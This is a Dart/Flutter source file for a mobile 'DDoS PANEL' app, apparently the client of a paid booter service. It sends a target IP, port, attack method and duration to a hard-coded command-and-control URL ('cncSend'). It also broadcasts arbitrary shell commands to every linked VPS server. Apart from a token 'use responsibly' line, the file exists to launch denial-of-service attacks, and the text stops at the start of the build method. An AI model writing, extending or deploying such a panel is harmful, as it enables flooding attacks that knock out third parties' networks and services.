import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:math';
import 'manage_server.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:video_player/video_player.dart';
import 'dart:ui';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDDoS;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDDoS,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  // Controllers
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final commandController = TextEditingController();

  // Video Controller
  VideoPlayerController? _videoController;

  // Constants
  static const String baseUrl = "http://kinncloud.sistems.tech:2052/api/vps";

  // GLOWING GREY THEME (sama dengan file lain)
  final Color _primaryColor = const Color(0xFF1A2A4A);      // Biru gelap tua
final Color _secondaryColor = const Color(0xFF0F1A2E);    // Biru kehitaman
final Color _accentColor = const Color(0xFF2A4A7A);       // Biru sedang

final Color _successColor = const Color(0xFF2E6B3E);      // Hijau gelap
final Color _warningColor = const Color(0xFFB86F2C);      // Oranye tua

final Color _darkBg = const Color(0xFF050A12);            // Hitam kebiruan pekat
final Color _darkerBg = const Color(0xFF020408);          // Hitam hampir mutlak
final Color _surfaceColor = const Color(0xFF0D1420);      // Biru hitam
final Color _cardColor = const Color(0xFF0A1018);         // Hitam kebiruan

final Color _glowColor1 = const Color(0xFF3B82F6);        // Biru terang (glow utama)
final Color _glowColor2 = const Color(0xFF2563EB);        // Biru medium (glow kedua)
final Color _glowColor3 = const Color(0xFF60A5FA);        // Biru muda (glow ketiga)

final Color _goldColor = const Color(0xFF3B82F6);         // Biru (sebagai pengganti emas)
final Color _roseColor = const Color(0xFF1E3A8A);         // Biru tua (pengganti rose)

// Tambahan opsional:
final Color primaryDark = const Color(0xFF020408);
final Color primaryBlue = const Color(0xFF3B82F6);
final Color accentBlue = const Color(0xFF60A5FA);
final Color neonBlue = const Color(0xFF00BFFF);

final Color primaryWhite = Colors.white;
final Color cardDark = const Color(0xFF0A1018);
final Color cardDarker = const Color(0xFF050A12);

final Color borderGrey = const Color(0xFF1A2A4A);
final Color glowColor = const Color(0x403B82F6);

  // State variables
  late AnimationController _fadeController;
  late AnimationController _glowController;
  late AnimationController _slideController;
  late AnimationController _rotateController;
  late Animation<double> _fadeAnimation;
  late Animation<double> _glowAnimation;
  late Animation<Offset> _slideAnimation;
  late Animation<double> _rotateAnimation;
  String selectedDoosId = "";
  double attackDuration = 60;
  bool isExecuting = false;
  bool isCommandExecuting = false;
  bool _isSpeedDialOpen = false;

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _setDefaultDoos();
    _initVideoBackground();
  }

  Future<void> _initVideoBackground() async {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          _videoController?.setLooping(true);
          _videoController?.setVolume(0.0);
          _videoController?.play();
          if (mounted) setState(() {});
        }).catchError((e) {
          debugPrint("Gagal memuat video background: $e");
        });
    } catch (e) {
      debugPrint("Exception saat memuat video: $e");
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        if (_videoController != null && _videoController!.value.isInitialized)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoController!.value.size.width,
                height: _videoController!.value.size.height,
                child: Opacity(opacity: 0.06, child: VideoPlayer(_videoController!)),
              ),
            ),
          )
        else
          Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: const Alignment(-0.2, -0.4),
                radius: 1.6,
                colors: [_glowColor1.withOpacity(0.05), _darkerBg, _darkBg],
              ),
            ),
          ),

        // Rotating rings
        AnimatedBuilder(
          animation: _rotateAnimation,
          builder: (context, _) {
            final size = MediaQuery.of(context).size;
            return Stack(
              children: [
                Positioned(
                  bottom: -size.height * 0.15,
                  right: -size.width * 0.2,
                  child: Transform.rotate(
                    angle: _rotateAnimation.value * pi * 2,
                    child: Container(
                      width: size.width * 0.7,
                      height: size.width * 0.7,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor1.withOpacity(0.05), width: 1),
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: -size.height * 0.08,
                  left: -size.width * 0.15,
                  child: Transform.rotate(
                    angle: -_rotateAnimation.value * pi,
                    child: Container(
                      width: size.width * 0.5,
                      height: size.width * 0.5,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor2.withOpacity(0.06), width: 0.8),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),

        // Vignette
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.0,
              colors: [
                Colors.transparent,
                Colors.black.withOpacity(0.55),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.12), width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 16, offset: const Offset(0, 6)),
        ],
      ),
      child: child,
    );
  }

  void _initializeAnimations() {
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    );

    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2500),
    )..repeat(reverse: true);

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1300),
    );

    _rotateController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 20),
    )..repeat();

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeOutCubic),
    );

    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.4),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOutCubic));

    _fadeController.forward();
    Future.delayed(const Duration(milliseconds: 200), () {
      _slideController.forward();
    });
  }

  void _setDefaultDoos() {
    if (widget.listDDoS.isNotEmpty) {
      selectedDoosId = widget.listDDoS[0]['ddos_id'];
    }
  }

  void _toggleSpeedDial() {
    setState(() {
      _isSpeedDialOpen = !_isSpeedDialOpen;
    });
  }

  Future<void> _sendDoos() async {
    if (isExecuting) return;

    setState(() => isExecuting = true);

    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (!_validateInputs(target, port)) {
      setState(() => isExecuting = false);
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);

      _handleResponse(data, target);
    } catch (_) {
      _showAlert("Connection Error", "An unexpected error occurred. Please try again.");
    } finally {
      setState(() => isExecuting = false);
    }
  }

  Future<void> _sendCommand() async {
    if (isCommandExecuting) return;

    final command = commandController.text.trim();
    if (command.isEmpty) {
      _showAlert("Error", "Command cannot be empty.");
      return;
    }

    setState(() => isCommandExecuting = true);

    try {
      final uri = Uri.parse("$baseUrl/sendCommand");
      final res = await http.post(
        uri,
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "key": widget.sessionKey,
          "command": command,
        }),
      );
      final data = jsonDecode(res.body);

      if (data["success"] == true) {
        if (mounted) Navigator.pop(context);
        _showCommandNotification("Command sent successfully!");
        _showAlert("Success", "Command has been successfully sent to all your VPS servers.");
      } else {
        _showAlert("Failed", data["error"] ?? "Failed to send command.");
      }
    } catch (_) {
      _showAlert("Connection Error", "An unexpected error occurred. Please try again.");
    } finally {
      setState(() => isCommandExecuting = false);
    }
  }

  void _showCommandNotification(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.check_circle, color: _glowColor1, size: 18),
            const SizedBox(width: 8),
            Expanded(
              child: Text(
                message,
                style: const TextStyle(color: Colors.white, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
              ),
            ),
          ],
        ),
        backgroundColor: _cardColor,
        duration: const Duration(seconds: 3),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: BorderSide(color: _glowColor1.withOpacity(0.3), width: 1),
        ),
      ),
    );
  }

  bool _validateInputs(String target, String port) {
    if (target.isEmpty || widget.sessionKey.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      return false;
    }

    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    if (!isIcmp && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      return false;
    }

    return true;
  }

  void _handleResponse(Map<String, dynamic> data, String target) {
    if (data["success"] == true) {
      _showAlert("Success", "Attack has been successfully sent to $target.");
    } else if (data["error"] != null) {
      _showAlert("Error", data["error"]);
    } else {
      _showAlert("Unknown", "Unknown response from server.");
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: _surfaceColor.withOpacity(0.98),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(28),
          side: BorderSide(color: _glowColor1.withOpacity(0.4), width: 1),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: _glowColor1.withOpacity(0.12),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1),
              ),
              child: Icon(
                title.contains("Success") ? Icons.check_circle : Icons.warning_amber_rounded,
                color: _glowColor1,
                size: 22,
              ),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Text(
                title,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.w700,
                  fontFamily: 'Rajdhani',
                  letterSpacing: 1.5,
                ),
              ),
            ),
          ],
        ),
        content: Text(
          msg,
          style: TextStyle(
            color: Colors.white.withOpacity(0.65),
            fontSize: 13,
            height: 1.6,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w500,
          ),
        ),
        actionsPadding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              backgroundColor: Colors.white.withOpacity(0.04),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(14),
                side: BorderSide(color: Colors.white.withOpacity(0.08), width: 1),
              ),
              padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 10),
            ),
            child: const Text(
              "CLOSE",
              style: TextStyle(
                color: Colors.white60,
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.w700,
                fontSize: 12,
                letterSpacing: 2,
              ),
            ),
          ),
        ],
      ),
    );
  }

  void _showCommandDialog() {
    commandController.clear();
    _toggleSpeedDial();
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.all(20),
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(24.0),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: _glowColor1.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(14),
                        border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1),
                      ),
                      child: const Icon(FontAwesomeIcons.terminal, color: Color(0xFFE0E0F8), size: 22),
                    ),
                    const SizedBox(width: 16),
                    ShaderMask(
                      shaderCallback: (bounds) => LinearGradient(
                        colors: [Color(0xFFE0E0F8), Color(0xFFD8D8EC), Color(0xFF9090B4)],
                      ).createShader(bounds),
                      child: const Text(
                        "EXECUTE COMMAND",
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: 18,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Rajdhani',
                          letterSpacing: 3,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                Text(
                  "Enter a command to execute on all your VPS servers:",
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.6),
                    fontFamily: 'Rajdhani',
                    fontWeight: FontWeight.w500,
                    fontSize: 12,
                  ),
                ),
                const SizedBox(height: 16),
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                    color: _cardColor,
                  ),
                  child: TextField(
                    controller: commandController,
                    style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
                    cursorColor: _glowColor1,
                    maxLines: 4,
                    decoration: InputDecoration(
                      hintText: "apt update && apt upgrade -y",
                      hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12, fontFamily: 'Rajdhani'),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide.none,
                      ),
                      filled: true,
                      fillColor: Colors.transparent,
                      contentPadding: const EdgeInsets.all(16),
                    ),
                  ),
                ),
                const SizedBox(height: 24),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    TextButton(
                      onPressed: isCommandExecuting ? null : () => Navigator.pop(context),
                      style: TextButton.styleFrom(
                        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                      ),
                      child: const Text("CANCEL", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600)),
                    ),
                    const SizedBox(width: 12),
                    GestureDetector(
                      onTap: isCommandExecuting ? null : _sendCommand,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(14),
                          boxShadow: [
                            BoxShadow(color: _glowColor1.withOpacity(0.3), blurRadius: 16),
                          ],
                        ),
                        child: isCommandExecuting
                            ? const SizedBox(
                                width: 20,
                                height: 20,
                                child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFF070709)),
                              )
                            : const Text(
                                "SEND",
                                style: TextStyle(
                                  fontWeight: FontWeight.w900,
                                  fontFamily: 'Rajdhani',
                                  letterSpacing: 2,
                                  fontSize: 12,
                                  color: Color(0xFF070709),
                                ),
                              ),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _navigateToManageServer() {
    _toggleSpeedDial();
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => ManageServerPage(sessionKey: widget.sessionKey),
      ),
    );
  }

  Widget _buildNeonHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
      child: AnimatedBuilder(
        animation: _glowAnimation,
        builder: (context, _) {
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            decoration: BoxDecoration(
              color: _cardColor,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.12 * _glowAnimation.value),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _glowColor1.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                  ),
                  child: const Icon(FontAwesomeIcons.shieldHalved, color: Color(0xFFE0E0F8), size: 22),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [_glowColor1, _accentColor, _glowColor2],
                        ).createShader(bounds),
                        child: const Text(
                          "DDoS PANEL",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 18,
                            fontWeight: FontWeight.w900,
                            fontFamily: "Rajdhani",
                            letterSpacing: 3,
                          ),
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        "Attack Configuration & Execution",
                        style: TextStyle(
                          color: _glowColor2.withOpacity(0.7),
                          fontSize: 11,
                          fontFamily: "Rajdhani",
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildTargetSection(bool isIcmp) {
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 4,
                  height: 20,
                  decoration: BoxDecoration(
                    color: _glowColor1,
                    borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)],
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  "TARGET CONFIGURATION",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            _buildPremiumInputField(
              icon: Icons.dns,
              label: "Target IP",
              hint: "Enter target IP address",
              controller: targetController,
            ),
            const SizedBox(height: 16),
            _buildPremiumInputField(
              icon: Icons.settings_ethernet,
              label: "Port",
              hint: isIcmp ? "ICMP protocol does not use ports" : "Enter port number",
              controller: portController,
              enabled: !isIcmp,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildPremiumInputField({
    required IconData icon,
    required String label,
    required String hint,
    required TextEditingController controller,
    bool enabled = true,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: TextStyle(
            color: _glowColor2.withOpacity(0.6),
            fontSize: 9,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w700,
            letterSpacing: 2,
          ),
        ),
        const SizedBox(height: 6),
        Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
            color: _cardColor,
          ),
          child: TextField(
            controller: controller,
            enabled: enabled,
            style: TextStyle(color: enabled ? Colors.white.withOpacity(0.9) : Colors.white.withOpacity(0.3), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
            cursorColor: _glowColor1,
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: Colors.white.withOpacity(0.25), fontSize: 12, fontFamily: 'Rajdhani'),
              prefixIcon: Icon(icon, color: _glowColor2.withOpacity(0.5), size: 18),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(14),
                borderSide: BorderSide.none,
              ),
              filled: true,
              fillColor: Colors.transparent,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildAttackSection() {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    
    return _buildGlassCard(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  width: 4,
                  height: 20,
                  decoration: BoxDecoration(
                    color: _glowColor1,
                    borderRadius: BorderRadius.circular(2),
                    boxShadow: [BoxShadow(color: _glowColor1.withOpacity(0.5), blurRadius: 6)],
                  ),
                ),
                const SizedBox(width: 12),
                Text(
                  "ATTACK CONFIGURATION",
                  style: TextStyle(
                    color: _glowColor2.withOpacity(0.7),
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                    letterSpacing: 3,
                    fontFamily: "Rajdhani",
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            // Duration Slider
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _surfaceColor,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _glowColor1.withOpacity(0.08), width: 1),
              ),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text(
                        "Duration",
                        style: TextStyle(color: _glowColor1, fontSize: 11, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani', letterSpacing: 1.5),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                        ),
                        child: Text(
                          "${attackDuration.toInt()}s (${(attackDuration / 60).toStringAsFixed(1)}m)",
                          style: TextStyle(color: _glowColor1, fontSize: 10, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani'),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 12),
                  SliderTheme(
                    data: SliderTheme.of(context).copyWith(
                      activeTrackColor: _glowColor1,
                      inactiveTrackColor: _glowColor1.withOpacity(0.15),
                      thumbColor: _glowColor1,
                      overlayColor: _glowColor1.withOpacity(0.2),
                      thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 8),
                      trackHeight: 3,
                    ),
                    child: Slider(
                      value: attackDuration,
                      min: 10,
                      max: 300,
                      divisions: 29,
                      onChanged: (value) {
                        setState(() => attackDuration = value);
                      },
                    ),
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      _buildDurationLabel("10s"),
                      _buildDurationLabel("1m"),
                      _buildDurationLabel("2m"),
                      _buildDurationLabel("3m"),
                      _buildDurationLabel("4m"),
                      _buildDurationLabel("5m"),
                    ],
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            // Attack Method Dropdown
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _surfaceColor,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: _glowColor1.withOpacity(0.08), width: 1),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "ATTACK METHOD",
                    style: TextStyle(color: _glowColor1, fontSize: 10, fontWeight: FontWeight.w800, fontFamily: 'Rajdhani', letterSpacing: 2),
                  ),
                  const SizedBox(height: 12),
                  DropdownButtonHideUnderline(
                    child: DropdownButton<String>(
                      dropdownColor: _cardColor,
                      value: selectedDoosId,
                      isExpanded: true,
                      iconEnabledColor: _glowColor1,
                      style: TextStyle(color: Colors.white.withOpacity(0.85), fontFamily: 'Rajdhani', fontSize: 13, fontWeight: FontWeight.w600),
                      items: widget.listDDoS.map((doos) {
                        final isSelected = selectedDoosId == doos['ddos_id'];
                        return DropdownMenuItem<String>(
                          value: doos['ddos_id'],
                          child: Container(
                            padding: const EdgeInsets.symmetric(vertical: 8),
                            child: Row(
                              children: [
                                Container(
                                  padding: const EdgeInsets.all(8),
                                  decoration: BoxDecoration(
                                    color: isSelected ? _glowColor1.withOpacity(0.15) : _glowColor1.withOpacity(0.08),
                                    borderRadius: BorderRadius.circular(10),
                                  ),
                                  child: Icon(
                                    FontAwesomeIcons.skull,
                                    color: isSelected ? _glowColor1 : _glowColor2,
                                    size: 14,
                                  ),
                                ),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Text(
                                    doos['ddos_name'],
                                    style: TextStyle(
                                      color: isSelected ? _glowColor1 : Colors.white.withOpacity(0.7),
                                      fontWeight: isSelected ? FontWeight.w800 : FontWeight.w600,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        );
                      }).toList(),
                      onChanged: (value) {
                        setState(() {
                          selectedDoosId = value!;
                        });
                      },
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildDurationLabel(String text) {
    return Text(
      text,
      style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 9, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
    );
  }

  Widget _buildExecuteButton() {
    return AnimatedBuilder(
      animation: _glowAnimation,
      builder: (context, _) {
        return GestureDetector(
          onTap: isExecuting ? null : _sendDoos,
          child: Container(
            width: double.infinity,
            height: 56,
            decoration: BoxDecoration(
              color: _glowColor1.withOpacity(0.92),
              borderRadius: BorderRadius.circular(16),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.35 * _glowAnimation.value),
                  blurRadius: 28,
                  spreadRadius: 2,
                  offset: const Offset(0, 8),
                ),
              ],
            ),
            child: Center(
              child: isExecuting
                  ? const SizedBox(
                      width: 22,
                      height: 22,
                      child: CircularProgressIndicator(color: Color(0xFF070709), strokeWidth: 2.5),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(FontAwesomeIcons.play, color: Color(0xFF070709), size: 16),
                        const SizedBox(width: 12),
                        Text(
                          "EXECUTE ATTACK",
                          style: const TextStyle(
                            fontSize: 13,
                            fontFamily: 'Rajdhani',
                            fontWeight: FontWeight.w900,
                            letterSpacing: 4,
                            color: Color(0xFF070709),
                          ),
                        ),
                      ],
                    ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildDisclaimer() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _surfaceColor,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _glowColor1.withOpacity(0.08), width: 1),
      ),
      child: Row(
        children: [
          Icon(FontAwesomeIcons.triangleExclamation, color: _warningColor.withOpacity(0.6), size: 12),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              "Use responsibly and in accordance with applicable laws",
              style: TextStyle(
                color: Colors.white.withOpacity(0.4),
                fontSize: 10,
                fontFamily: 'Rajdhani',
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSpeedDial() {
    return Column(
      mainAxisSize: MainAxisSize.min,
      crossAxisAlignment: CrossAxisAlignment.end,
      children: [
        if (_isSpeedDialOpen) ...[
          AnimatedOpacity(
            opacity: _isSpeedDialOpen ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 200),
            child: _buildSpeedDialButton(
              icon: Icons.dns,
              label: "Manage Server",
              onTap: _navigateToManageServer,
            ),
          ),
          const SizedBox(height: 10),
          AnimatedOpacity(
            opacity: _isSpeedDialOpen ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 250),
            child: _buildSpeedDialButton(
              icon: Icons.terminal,
              label: "Send Command",
              onTap: _showCommandDialog,
            ),
          ),
          const SizedBox(height: 10),
        ],
        // Main FAB
        GestureDetector(
          onTap: _toggleSpeedDial,
          child: Container(
            width: 52,
            height: 52,
            decoration: BoxDecoration(
              color: _glowColor1.withOpacity(0.92),
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.4),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Icon(
              _isSpeedDialOpen ? Icons.close : Icons.add,
              color: _darkerBg,
              size: 24,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSpeedDialButton({
    required IconData icon,
    required String label,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        height: 42,
        padding: const EdgeInsets.symmetric(horizontal: 16),
        decoration: BoxDecoration(
          color: _glowColor1.withOpacity(0.92),
          borderRadius: BorderRadius.circular(30),
          boxShadow: [
            BoxShadow(color: _glowColor1.withOpacity(0.3), blurRadius: 12),
          ],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: _darkerBg, size: 16),
            const SizedBox(width: 8),
            Text(
              label,
              style: TextStyle(
                color: _darkerBg,
                fontSize: 11,
                fontWeight: FontWeight.w800,
                fontFamily: 'Rajdhani',
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Column(
      children: [
        Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.transparent, _glowColor1.withOpacity(0.1), Colors.transparent],
            ),
          ),
        ),
        const SizedBox(height: 16),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            _buildFooterDot(_successColor),
            const SizedBox(width: 8),
            _buildFooterText("SECURE"),
            const SizedBox(width: 20),
            Container(width: 1, height: 10, color: Colors.white.withOpacity(0.06)),
            const SizedBox(width: 20),
            Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.12), size: 12),
            const SizedBox(width: 20),
            _buildFooterDot(_glowColor2),
            const SizedBox(width: 8),
            _buildFooterText("ENCRYPTED"),
          ],
        ),
        const SizedBox(height: 8),
        Text(
          "VANTHRA SECURITY • ENCRYPTED",
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 8,
            letterSpacing: 3,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w600,
          ),
        ),
      ],
    );
  }

  Widget _buildFooterDot(Color color) {
    return Container(
      width: 5,
      height: 5,
      decoration: BoxDecoration(
        color: color,
        shape: BoxShape.circle,
        boxShadow: [BoxShadow(color: color, blurRadius: 5)],
      ),
    );
  }

  Widget _buildFooterText(String text) {
    return Text(
      text,
      style: TextStyle(
        color: Colors.white.withOpacity(0.25),
        fontSize: 8,
        fontWeight: FontWeight.w700,
        letterSpacing: 2.5,
        fontFamily: 'Rajdhani',
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
